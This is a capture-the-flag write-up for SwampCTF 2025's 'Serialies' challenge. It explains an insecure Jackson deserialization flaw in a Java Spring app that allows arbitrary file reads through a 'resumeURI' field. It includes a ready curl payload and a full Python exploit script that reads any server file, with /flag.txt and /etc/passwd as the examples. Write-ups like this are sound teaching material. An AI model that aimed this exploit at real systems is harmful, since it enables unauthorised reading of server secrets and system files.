---
title: "Serialies 🔎 – Java Deserialization & File Read (SwampCTF 2025)"
tags: [CTF, Web, Java, deserialization, file read, swampctf]
---

# Serialies 🔎

![web](https://img.shields.io/badge/category-Web-blue)
![Difficulty](https://img.shields.io/badge/difficulty-easy-blue)
![CTF](https://img.shields.io/badge/Event-SwampCTF%202025-purple)
![Java](https://img.shields.io/badge/Java-deserialization-red)

> "You either deserialize... or you get deserialized." — Sun Tzu (probably)

This challenge demonstrates a **classic insecure deserialization vulnerability** in a Java backend. 

A POST endpoint accepts Java objects via JSON, and unserializes them... without restrictions. 

This allows arbitrary file reads and even object injection.

## 📂 Table of Contents
- [Recon & Behavior 🚨](#recon--behavior-)
- [The Vulnerability 💥](#the-vulnerability-)
- [Crafting Our Payload ⚙️](#crafting-our-payload-%EF%B8%8F)
- [Automated Exploit 🚀](#automated-exploit-)
- [Conclusion 🧠](#conclusion-)

## Recon & Behavior 🚨

We're provided with a Java web application in a ZIP archive. After spinning it up or analyzing the challenge domain:

```
http://chals.swampctf.com:44444/api/person
```

This endpoint:
- Accepts POST requests with serialized Java objects in JSON format
- Deserializes them into custom classes: `Person`, `Job`, and `Address`
- Automatically calls `Job.init()` if `job` is present

📅 **Key clue** in the code:

In the PersonController, when we make a POST request:

![Init call in POST request](https://github.com/user-attachments/assets/27e64964-ceeb-4fd5-a0b1-15e7b96f0c1c)

Inside `init()` of Job class:

![Init vulnerable](https://github.com/user-attachments/assets/8205f77a-a5e8-4320-8175-6dce689066ff)

🚧 **Bingo**: we can trigger arbitrary file reads from the server by crafting an object with a `resumeURI` field.

## The Vulnerability 💥

### Insecure Deserialization + File Read
- Accepts serialized objects via JSON
- No class filtering or deserialization restrictions
- Automatically reads file content from a `resumeURI`

By POSTing this:
```
"resumeURI": "file:///flag.txt"
```
We trigger:
```
Files.readString(Paths.get("/flag.txt"))
```
and the result ends up in:
```
"resume": "<contents of flag.txt>"
```

The final objects are publicly visible at:
```
GET /api/person/<uuid>
```

## Crafting Our Payload ⚙️

We can directly craft our payload using `curl`. Example:
```
curl -X POST http://chals.swampctf.com:44444/api/person \
  -H "Content-Type: application/json" \
  -d '{
    "@class": "com.serialies.serialies.Person",
    "id": "13371337-1111-1111-1111-111111111111",
    "name": "notagain",
    "age": 1337,
    "address": {
      "@class": "com.serialies.serialies.Address",
      "street": "leet st",
      "city": "HaxCity",
      "state": "CTF",
      "zipCode": "1337"
    },
    "job": {
      "@class": "com.serialies.serialies.Job",
      "title": "h4x0r",
      "company": "Otaku Inc",
      "salary": 999999.0,
      "resume": "injected by notagain",
      "resumeURI": "file:///flag.txt"
    }
  }'
```

Then retrieve your object:
```
curl http://chals.swampctf.com:44444/api/person/13371337-1111-1111-1111-111111111111
```

And the flag appears in the `resume` field.

## Automated Exploit 🚀

```python
#!/usr/bin/env python3

import requests
import uuid
import argparse
import sys

def generate_payload(file_path, attacker_name="notagain"):
    """Create the JSON payload to inject a vulnerable object"""
    exploit_id = str(uuid.uuid4())
    payload = {
        "@class": "com.serialies.serialies.Person",
        "id": exploit_id,
        "name": attacker_name,
        "age": 1337,
        "address": {
            "@class": "com.serialies.serialies.Address",
            "street": "leet st",
            "city": "HaxCity",
            "state": "CTF",
            "zipCode": "1337"
        },
        "job": {
            "@class": "com.serialies.serialies.Job",
            "title": "h4x0r",
            "company": "Otaku Inc",
            "salary": 999999.0,
            "resume": f"{attacker_name} wuz here 😈",
            "resumeURI": f"file://{file_path}"
        }
    }
    return exploit_id, payload

def send_payload(base_url, payload):
    """Send a POST request with the JSON payload"""
    res = requests.post(base_url, json=payload)
    if res.ok:
        print("[+] Payload successfully sent")
    else:
        print("[-] Failed to send payload")
        sys.exit(1)

def fetch_flag(base_url, exploit_id):
    """Send a GET request to retrieve the object and extract file content"""
    url = f"{base_url}/{exploit_id}"
    res = requests.get(url)
    if not res.ok:
        print("[-] Failed to fetch response")
        sys.exit(1)

    try:
        data = res.json()
        resume = data["job"]["resume"]
        return resume
    except Exception as e:
        print("[-] Error while parsing response:", str(e))
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="SwampCTF - Serialies File Read Exploit")
    parser.add_argument("--url", required=True, help="Base URL (e.g. http://chals.swampctf.com)")
    parser.add_argument("--port", required=True, type=int, help="Target port")
    parser.add_argument("--file", required=True, help="Path to the file you want to read (e.g. /flag.txt)")
    args = parser.parse_args()

    base_url = f"{args.url}:{args.port}/api/person"
    exploit_id, payload = generate_payload(args.file)

    send_payload(base_url, payload)
    content = fetch_flag(base_url, exploit_id)
    
    print(f"[+] ID: {exploit_id}")
    print(f"[+] File Content: {content}")

if __name__ == "__main__":
    main()
```

### Output

![Flag displayed](https://github.com/user-attachments/assets/f8d459d2-7228-4a3f-8d94-3e6bdf348ef1)

```
[+] File Content: swampCTF{f1l3_r34d_4nd_d3s3r14l1z3_pwn4g3_x7q9z2r5v8}
```

On `http://chals.swampctf.com:44444/api/person/882ab274-c402-40a6-86b8-ca98b652225d`:

![Flag on website](https://github.com/user-attachments/assets/8b5ca719-5a9f-4559-a5a9-9ac71f21f8f5)

We can also read /etc/passwd too for example:

![/etc/passwd displayed](https://github.com/user-attachments/assets/1caf8c31-3399-4bcc-a4ef-2d43653a8300)

And on `http://chals.swampctf.com:44444/api/person/11d80c76-44af-4889-b5d5-78f88a5ab84a`:

![/etc/passwd on website](https://github.com/user-attachments/assets/a6195733-e265-45cc-9419-77fb35a79a9a)

## Conclusion 🧠

- A textbook example of **insecure deserialization** in Java
- Unsafe usage of `@class` types in Spring Boot with Jackson
- File read enabled via URI-based auto-loading

🔥 Bonus: no need for ysoserial, no bytecode injection — just good ol' JSON and understanding the logic.

🔙 [Back to SwampCTF 2025 Writeups](../../)
